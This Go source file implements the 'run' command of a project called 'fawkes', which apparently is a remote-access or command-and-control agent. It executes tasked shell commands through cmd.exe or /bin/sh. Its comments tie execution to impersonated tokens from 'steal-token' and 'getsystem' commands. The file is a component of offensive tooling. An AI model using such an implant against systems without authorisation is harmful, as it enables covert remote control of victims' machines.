package commands

import (
	"fmt"
	"os/exec"
	"runtime"
	"strings"

	"fawkes/pkg/structs"
)

// RunCommand implements the run command
type RunCommand struct{}

// Name returns the command name
func (c *RunCommand) Name() string {
	return "run"
}

// Description returns the command description
func (c *RunCommand) Description() string {
	return "Execute a command in a child process"
}

// Execute executes the run command
func (c *RunCommand) Execute(task structs.Task) structs.CommandResult {
	// Check if parameters are provided
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: No command specified",
			Status:    "error",
			Completed: true,
		}
	}

	// Parse the command - handle shell execution based on OS
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		// On Windows, use cmd.exe /c
		cmd = exec.Command("cmd.exe", "/c", task.Params)
	} else {
		// On Unix-like systems, use sh -c
		cmd = exec.Command("/bin/sh", "-c", task.Params)
	}

	// If impersonating (steal-token/getsystem/make-token), run child
	// process with the impersonated token's security context
	configureProcessToken(cmd)

	// Capture combined output (stdout and stderr)
	output, err := cmd.CombinedOutput()

	if err != nil {
		// Even if there's an error, we might have output to show
		outputStr := string(output)
		if outputStr != "" {
			return structs.CommandResult{
				Output:    fmt.Sprintf("%s\nError: %v", outputStr, err),
				Status:    "error",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error executing command: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Successful execution
	outputStr := strings.TrimSpace(string(output))
	if outputStr == "" {
		outputStr = "Command executed successfully (no output)"
	}

	return structs.CommandResult{
		Output:    outputStr,
		Status:    "success",
		Completed: true,
	}
}
